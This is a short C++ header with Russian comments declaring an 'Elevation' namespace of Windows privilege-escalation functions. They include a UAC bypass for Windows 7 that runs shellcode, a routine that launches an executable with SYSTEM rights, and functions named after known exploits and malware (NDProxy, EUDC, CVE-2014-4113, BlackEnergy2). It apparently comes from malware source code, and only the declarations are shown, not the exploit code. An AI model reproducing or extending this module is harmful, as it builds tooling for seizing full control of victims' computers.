#pragma once

//повышение привилегий

namespace Elevation
{

//запускает файл nameExe и дает ему системные права
bool Sdrop( const char* nameExe );
bool NDProxy( DWORD pid = 0 );
bool PathRec();

//обход UAC для Win7
//после обхода shellcode выполняет выход из процесса, поэтому если запускается длл, то из нее нужно выйти только после выполнения
//всех операций
bool UACBypass( const char* engineDll, const char *commandLine, int method = 0 );
bool COM( const char* dllPath, const char* cmd );
//wait = true если нужно дождаться выполнения cmd
bool BlackEnergy2( const char* cmd, bool wait = false );

//подымает права до системных
bool EUDC();
bool CVE2014_4113();

}
